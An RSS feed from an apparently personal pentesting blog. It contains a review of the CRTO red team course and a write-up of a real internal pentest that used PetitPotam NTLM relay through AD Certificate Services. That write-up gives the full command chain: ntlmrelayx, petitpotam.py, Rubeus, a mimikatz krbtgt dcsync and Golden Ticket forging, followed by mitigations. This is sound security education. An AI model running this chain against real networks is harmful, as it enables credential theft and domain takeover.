<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Jake Mai</title><link>https://jakemai0.github.io/posts/</link><description>Recent content in Posts on Jake Mai</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>&lt;a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0&lt;/a></copyright><lastBuildDate>Fri, 22 Apr 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://jakemai0.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Certified Red Team Operator (CRTO) by Zero Point Security Review</title><link>https://jakemai0.github.io/posts/crto/</link><pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/crto/</guid><description>Introduction Red Team Ops is a course offered by Zero Point Security, which serves as an Introduction to Red Teaming with a focus on the use of Cobalt Strike C2. When the students finish the course and pass the 48 hour exam (don&amp;rsquo;t worry, it&amp;rsquo;s not like the 300 level courses by OffSec), the students will receive the &amp;ldquo;Certified Red Team Operator&amp;rdquo; certification. If you&amp;rsquo;re new to the community, Zero Point Security is a one-man company created and operated by Daniel Duggan aka RastaMouse.</description><content type="html"><![CDATA[<h2 id="introduction">Introduction</h2>
<p><a href="https://courses.zeropointsecurity.co.uk/courses/red-team-ops">Red Team Ops</a> is a course offered by Zero Point Security, which serves as an Introduction to Red Teaming with a focus on the use of <a href="https://www.cobaltstrike.com/">Cobalt Strike</a> C2. When the students finish the course and pass the 48 hour exam (don&rsquo;t worry, it&rsquo;s not like the 300 level courses by OffSec), the students will receive the &ldquo;Certified Red Team Operator&rdquo; certification.
If you&rsquo;re new to the community, Zero Point Security is a one-man company created and operated by Daniel Duggan aka <a href="https://twitter.com/_rastamouse?lang=en">RastaMouse</a>. He is well known in the infosec community for many of his contributions such as the open-source C2 <a href="https://github.com/SharpC2/SharpC2">SharpC2</a>, the <a href="https://app.hackthebox.com/prolabs/overview/rastalabs">RastaLabs</a> ProLab on HackTheBox, the <a href="https://courses.zeropointsecurity.co.uk/courses/c2-development-in-csharp">C2 Development in C#</a> course, the <a href="https://courses.zeropointsecurity.co.uk/courses/offensive-driver-development">Offensive Driver Development</a> course and the RTO course that I will be talking about.</p>
<p>In this post I will be going over my experience with the course and the exam, what I think about this course and whether you should be taking it or not (spoiler: yes, you should).</p>
<h2 id="my-background">My Background</h2>
<p>I am still a fresh noob when it comes to the Offensive Security domain, with less than a year of experience as a pentester at the time of writing this. I did however have prior experience working as a SOC analyst, so I joined the Red side with a hint of Blue, and this has benefited me greatly (I&rsquo;ll get to that part later). I had my OSCP and CRTP in November 2021 and January 2022 respectively, my knowledge and skills could barely scratch the surface when it comes to Pentesting/Red Teaming, but at least I consider myself somewhat competent with &ldquo;how to computer&rdquo;.
I&rsquo;ve always wanted to dive into Red Teaming and Adversary Emulation, so after CRTP, CRTO was next on my checklist.</p>
<h2 id="the-course-material-and-lab-experience">The Course Material and Lab Experience</h2>
<p>The course content was absolutely amazing, it goes over from the basic &ldquo;high level&rdquo; of what is Red Teaming, what is a C2, Reconnaissance, Initial Compromise, to full Domain Takeover.</p>
<p>I enjoyed the &ldquo;high level&rdquo; theory part of Red Teaming more than I thought I did, so I went ahead and bought the book <a href="https://www.amazon.com/Red-Team-Development-Operations-practical/dp/B083XVG633">Red Team Development and Operations</a> by Joe Vest and James Tubberville. This is an amazing book and probably a must-read if you want to get into Red Teaming.
There are 26 modules in the course so I won&rsquo;t be able to go over each of them here, but here are the highlights of the course in my opinion.</p>
<h3 id="cobalt-strike">Cobalt Strike</h3>
<p>What&rsquo;s not to love about getting your hands on one of the best C2 frameworks out there. <a href="https://www.cobaltstrike.com/">Cobalt Strike</a> was originally created by Raphael Mudge back in 2012, it is now  maintained by Help System and is still considered to be one of the best C2 frameworks due to its powerful and robust capabilities. I&rsquo;ve never gotten a chance to use Cobalt Strike or any of the C2 framework before, so this was an eye-opening experience. Since the course focuses on the use of C2, everything you do will be via Cobalt Strike, from catching the first beacon from a macro-embedded Word doc, host privsec, lateral movement, pivoting, tunneling, to getting DA and EA.

    <img src="/images/cs.png"  alt="Cobalt Strike in action"  class="center"  style="border-radius: 8px;"  />


<em>Cobalt Strike in action</em></p>
<p>The course also touches on some basic AV Evasion for Cobalt Strike payloads, by teaching you how to modify the artifact-kit and resource-kit to bypass AV on the target machines (not EDR evasion unfortunately, RastaMouse did hint that this topic would be covered in RTO2, so I guess we&rsquo;ll see). Another cool feature of Cobalt Strike is Malleable C2 Profile, it gives the Operators total control of the beacon&rsquo;s indicators such as network and in-memory artifacts, HTTP(S) requests coming in and out, everything is fully customisable. This feature can make Cobalt Strike much harder to detect, and can also be used to emulate the TTPs of a particular APT in an Red Team Engagement.</p>
<h3 id="kibana">Kibana</h3>
<p>Ah, flashback to the SOC days. In previous verisons of the lab, Splunk was the predecessor, however, the new lab uses ELK as a mini &lsquo;SIEM&rsquo;. In my opinion, this is a great feature and a selling point for RTO. Yes, attacking a network is cool but what&rsquo;s cooler is you get to see what&rsquo;s going on on the other side of the fence, you get to see what the Blue Team Operators see. Combining with the #OPSEC tips and tricks, I got to see what event Windows generates via Kibana when you launch an attack, why is this particular technique is considered bad #OPSEC and what should you do instead to be more stealth.
I had many &ldquo;Ahhhhhh&rdquo; moments as I was going through the course and looking at the Kibana console, I&rsquo;d be lying if I say I knew 100% what each event meant and why they were there when I was a SOC analyst. But now from an attacker perspective, it all made sense. This is why I strongly believe that to be a good Red Team Operator, you also need to be a good Blue Team Analyst and vice versa. It&rsquo;s Art of War all over again, &ldquo;Knowing Your Enemy&rdquo;.

    <img src="/images/kibana.png"  alt="Kibana"  class="center"  style="border-radius: 8px;"  />


<em>Kibana console</em></p>
<p>A small issue I encountered was, sometimes, the winlogbeat sensor did not work properly on some machines and I ended up not seeing any events being ingested.</p>
<h3 id="active-directory-exploitation">Active Directory Exploitation</h3>
<p>Windows Active Directory Exploitation was the bulk of the course. I felt like CRTP was a great primer for me, without any practical AD experience before, it taught me basic understanding of AD hacking. This time, I got to do it all over again with Cobalt Strike. However, that doesn&rsquo;t mean that I didn&rsquo;t learn anything new. The AD Exploitation modules on RTO really reinforced my skills and taught me new techniques on Lateral Movement, Reverse Port Forwarding, Pivoting, DPAPI, GPO Abuses, DCAL Abuses, LAPS and Active Directory Certificate Services (ADCS).</p>
<p>The section on ADCS was absolute gold, thanks to it, I was able to compromise DA in a recent internal pentest by abusing NTLM Relay via ADCS (PetitPotam attack). I will make a detailed post on this in a few weeks.</p>
<h3 id="the-lab">The Lab</h3>
<p>The lab for RTO was hosted on SnapLab, overall, it was a smooth experience for me. Everything was done via a web portal using Guacamole Apache, you connect to the lab directly through it. All tools were provided on the attacker-machine, it was a complete sandboxed environment to protect Cobalt Strike&rsquo;s license (understandable). There was no flag to collect in the unlike the previous versions of the lab. It was designed so that you can follow a long the examples in the course material and experiment with different techniques and tactics, more like an &ldquo;Open World&rdquo; lab ;)</p>
<p>Also, the lab is private and you would not have to share it with others. Phew!</p>
<h3 id="pricing-and-support">Pricing and Support</h3>
<p>RTO was relatively cheap when you compare it to other big players in the game like Offensive Security, SANS and INE. I bought the RTO bundle including the course and 40 hours of lab time for £399 (if you buy the lab time separately, it is £1.25 per hour). I finished the course and the exam and still had about 10 hours of lab time remaning, which I still have access to. Based on what provided, this was an absolute bargain, not to mention, you have lifetime access to the course material and its future updates.</p>
<p>For support, since RastaMouse in the CEO, Content Manager, Lab Maintainer as well as Student Support Officer, he might be overwhelmed with emails and queries. RTO&rsquo;s <a href="https://discord.com/invite/FBgTXB45?utm_source=Discord%20Widget&amp;utm_medium=Connect">Discord</a> server is the place to go for real time support. You will have RastaMouse himself answering your questions, when he is unable too, you have heaps of other knowledgable members in the chat to help you out. It is also a good place for banters :)</p>
<h2 id="exam">Exam</h2>
<p>The exam was a roller coaster for me. I booked to sit the exam on Good Friday, so that I could make good use of the Easter long weekend. After booking the exam, you would receive a PDF containing the TTPs you need to emulate using Malleable C2 Profile along with customised tactical approach. The exam is a 4-day event for 48 hours (you have 48 hours to do the exam, and the result will come out after 4 days), the best thing is you can pause the exam anytime you want for breaks, 48 hours is a lot of time so make sure you eat and sleep well for a fresh mind. The final goal of the exam is to reach an external domain, and to pass you will need to collect 6/8 flags, you also don&rsquo;t need to submit a report, which is a nice change of wind.</p>
<p>My first day did not go so well, I got 2 flags in the first 4 hours, and got stuck for the next 7 hours. I thought I&rsquo;ve tried everything, I didn&rsquo;t know what I was missing. Frustrated, I went to bed, next day I spent the whole day playing Squash, had dinner with friends and played Mario Kart :&rsquo;). I think I just needed a break. Picked up where I left off on Sunday, I finally got my third flag, then fourth. &ldquo;They&rsquo;re falling like Dominoes now&rdquo; I told myself, it was all fun and games until flag 6, the passing flag. I went full r*tard and reset the firewall setting on one box, what could go wrong right? It effectively killed a very important beacon in the compromise chain, and I completely lost connection to that machine. I was pulling my hair out.</p>
<p>Oh well, I had 26 hours left, so I reverted everything and started from square one. Took me a while to get to the point I was before, and yes, I finally got flag 6 at 2am. Had a bit too much coffee by then so I tried grinding out the next 2 flags, and managed to get 8/8 at 4.30am after 20 hours straight :&rsquo;).

    <img src="/images/exam.png"  alt="Exam Timeline"  class="center"  style="border-radius: 8px;"  />


<em>My exam timeline</em>

    <img src="/images/cert.png"  alt="Exam Timeline"  class="left"  style="border-radius: 8px;"  />


<em>Another one to the collection</em></p>
<h2 id="final-thoughts">Final Thoughts</h2>
<p>For me, RTO was the best course I&rsquo;ve ever taken so far, material was top notch, great lab experience, and I actually enjoyed doing the course. Can&rsquo;t wait for RTO2 :)
<br>
I will start OffShore ProLab on HackTheBox in a week or two, now I&rsquo;ve got the knowledge, let&rsquo;s put it into the test and gain some more skills! After that, OSEP is next on my list.</p>
<p>Should you take this course? <strong>Yes!!</strong>
<br>
Are you a pentester who wants to step up your AD and internal network testing game? <strong>Big Yes</strong>
<br>
Are you wanting to transit to Red Teaming? <strong>Ohhh Yesss!</strong>
<br>
Are you a Blue Team Operator/SOC Analyst who wants to use the knowledge from the Offensive side to reinforce your Defending/Detection game? <strong>Heck Yes!</strong>
<br>
Are you not in Tech at all and having no clue how you got here? <strong>Um, maybe not CRTO yet, but if you think this sounds cool, start hacking :&quot;)</strong></p>
]]></content></item><item><title>Pwning Domain Admin with PetitPotam</title><link>https://jakemai0.github.io/posts/petitpotam/</link><pubDate>Fri, 22 Apr 2022 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/petitpotam/</guid><description>Disclaimer: Original research was done by Will Schroeder and Lee Christensen in their Certified Pre-Owned whitepaper.
PetitPotam PoC was written by Lionel Gilles.
I still need to conduct more research and experiment to fully understand this attack and the underlying technicalities.
Introduction In a recent network pentest, I found an ADCS CA (Active Directory Certificate Services Certificate Authortity) on the target domain. I haven&amp;rsquo;t gotten a chance to play around with ADCS before, but I did remembered reading about one attack technique called PetitPotam that abuses NTLM Relay via ADCS to take over the domain.</description><content type="html"><![CDATA[<p><strong>Disclaimer:</strong>
Original research was done by <a href="https://twitter.com/harmj0y">Will Schroeder</a> and <a href="https://twitter.com/tifkin_">Lee Christensen</a> in their <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">Certified Pre-Owned</a> whitepaper.</p>
<p><a href="https://github.com/topotam/PetitPotam">PetitPotam</a> PoC was written by <a href="https://twitter.com/topotam77">Lionel Gilles</a>.</p>
<p>I still need to conduct more research and experiment to fully understand this attack and the underlying technicalities.</p>
<h2 id="introduction">Introduction</h2>
<p>In a recent network pentest, I found an ADCS CA (Active Directory Certificate Services Certificate Authortity) on the target domain. I haven&rsquo;t gotten a chance to play around with ADCS before, but I did remembered reading about one attack technique called <a href="https://github.com/topotam/PetitPotam">PetitPotam</a> that abuses NTLM Relay via ADCS to take over the domain. After some time reading up about the technique and getting my hands dirty, I have successfully compromised DA! This blog post will be a quick rundown of how I got DA using this attack.</p>
<h3 id="active-directory-certificate-services">Active Directory Certificate Services</h3>
<p>On a high level, ADCS is a server role in Windows Active Directory that allows users to build a Public Key Infrastructure (PKI). This means that it can provide digital certificates and digital signature capabilities, improving confidentiality via encryption and integrity via digital signatures. The practical applications of ADCS are VPN (Virtual Private Network), IPSec (Internet Protocol Security), EFS (Encrypting File System), Smart Card logon, and more.</p>
<h3 id="petitpotam">PetitPotam</h3>
<p>PetitPotam is an attack technique that abuses NTLM Relay via ADCS CA with Web Enrollment enabled by exploiting the MS-EFSRPC (Encrypting File System Remote Protocol). This technique allows an attacker in the internal network to force the Domain Controller (DC) machine account to authenticate towards a machine with NTLM relay configured (the attacker machine). This authentication will then be relayed to the CA Web Enrollment to request for a certificate as the DC. This certificate can be captured and be used to request for a TGT as the DC machine account. With this TGT, Mimikatz can be used to dump credentials of the DA or the krbtgt account to fully compromise the Active Directory environment.</p>
<h2 id="action">Action</h2>
<p>From the foothold domain machine, I did some enumeration and was able to locate a CA in the domain. A native Windows tool called <code>certutil.exe</code> or <a href="https://github.com/GhostPack/Certify">Certify</a> can be used for this purpose. Certify is a C# tool to enumerate and abuse misconfigurations in ADCS, this tool can also be used to look for vulnerable certificate templates. Misconfiguration in certificate templates can lead to privilege escaltion, unfortunately, no vulnerable template was identified.

    <img src="/images/CA_.png"  alt="CA"  class="left"  style="border-radius: 8px;"  />


<em>Identified CA</em></p>
<p>Now I&rsquo;ve got the domain name for the CA Web Enrollment Interface at <code>https://ca-hostname/certsrv</code>, I was able to access this domain and request for a certificate to get a <code>certfnsh.asp</code>.

    <img src="/images/CA_WebE.png"  alt="CA Web Enrollment"  class="left"  style="border-radius: 8px;"  />


<em>CA Web Enrollment Portal</em>

    <img src="/images/certfnsh.png"  alt="certfnsh.asp"  class="left"  style="border-radius: 8px;"  />


<em>Generated certfnsh.asp</em></p>
<p>With this, I was able to launch the ADCS Relay attack.</p>
<p>From the attacker box, launch <code>ntlmrelayx.py</code>:</p>
<pre tabindex="0"><code>ntlmrelayx.py -debug -smb2support --target https://ca-hostname/certsrv/certfnsh.asp --adcs --template domaincontroller
</code></pre><p>The <code>--template</code> argument would depend on the account that would be relayed. Since I was relaying a DC, then the template should be <code>domaincontroller</code>, you could enumerate the template on the ADCS using Certify: <code>Certify.exe cas</code></p>
<p>On another window on the attacker box, launch <a href="https://github.com/topotam/PetitPotam">PetitPotam</a> against the DC:</p>
<pre tabindex="0"><code>sudo python3 petitpotam.py &lt;Attack box&#39;s IP&gt; &lt;DC&#39;s IP&gt;
</code></pre><p>The attack was successful, and on the ntlmrelayx window, a Base64 encoded certificate of the DC machine account was captured:

    <img src="/images/b64cert.png"  alt="certfnsh.asp"  class="left"  style="border-radius: 8px;"  />


<em>Base64 certificate of DC$</em></p>
<p>From here, I proceeded with requesting for a TGT of DC$ using <code>Rubeus</code>:</p>
<pre tabindex="0"><code>Rubeus.exe asktgt /user:DC$ /domain:&lt;domain&gt; /certificate:&lt;base64-certificate&gt; /ptt
</code></pre><p>With the <code>/ptt</code> option, the returned TGT of DC$ would be imported into my current user session.
<br>
From here, a threat actor can aim for the highest prize by dumping the AES256 encryption key of the krbtgt account to forge a Golden Ticket:
Launch Mimikatz and dump the AES256 encryption key:</p>
<pre tabindex="0"><code># From mimikatz:
lsadump::dcsync /domain:&lt;domain&gt; /user:krbtgt
</code></pre><p>Once the AES256 encryption key of the krbtgt account was captured, the Golden Ticket could be forged:</p>
<pre tabindex="0"><code># From Mimikatz:
kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;SID of the domain&gt; /aes256:&lt;aes256 key&gt; /ticket:goldie.kirbi
</code></pre><p>Proceeded to inject the Golden Ticket:</p>
<pre tabindex="0"><code>Rubeus.exe ptt /ticket:goldie.kirbi
</code></pre><p>GG!</p>
<h2 id="mitigation">Mitigation</h2>
<p>The misconfiguration has been mitigated immediately by enabling Extended Protection for Authentication (EPA) for CA Web Enrollment and Certificate Enrollment Web Service.</p>
<p>Addition mitigations that are recommended by Microsoft are:</p>
<ul>
<li>Disable NTLM Authentication on Windows Domain Controllers.</li>
<li>Disable NTLM on any ADCS server using Group Policy.</li>
<li>Disable NTLM for Internet Information Services (IIS) on AD CS Servers in the domain running the &ldquo;Certificate Authority Web Enrollment&rdquo; or &ldquo;Certificate Enrollment Web Service&rdquo; services.
\</li>
</ul>
<p>More information can be found <a href="https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429?ranMID=46131&amp;ranEAID=a1LgFw09t88&amp;ranSiteID=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&amp;epi=a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA&amp;irgwc=1&amp;OCID=AID2200057_aff_7806_1243925&amp;tduid=%28ir__pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00%29%287806%29%281243925%29%28a1LgFw09t88-Ug.hyM7w8Zm3RQRUQGEifA%29%28%29&amp;irclickid=_pbc1z9tr09kf62lfkn9aaeqtum2xtbsisdfgml0c00">here</a></p>
]]></content></item><item><title>Certified Red Team Professional (CRTP) by Pentester Academy Review</title><link>https://jakemai0.github.io/posts/crtp/</link><pubDate>Tue, 01 Feb 2022 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/crtp/</guid><description>Introduction Work in Progress</description><content type="html">&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>Work in Progress&lt;/p></content></item><item><title>Offensive Security Certified Professional (OSCP) Review</title><link>https://jakemai0.github.io/posts/oscp/</link><pubDate>Wed, 01 Dec 2021 00:00:00 +0000</pubDate><guid>https://jakemai0.github.io/posts/oscp/</guid><description>Introduction Work in Progress</description><content type="html">&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>Work in Progress&lt;/p></content></item></channel></rss>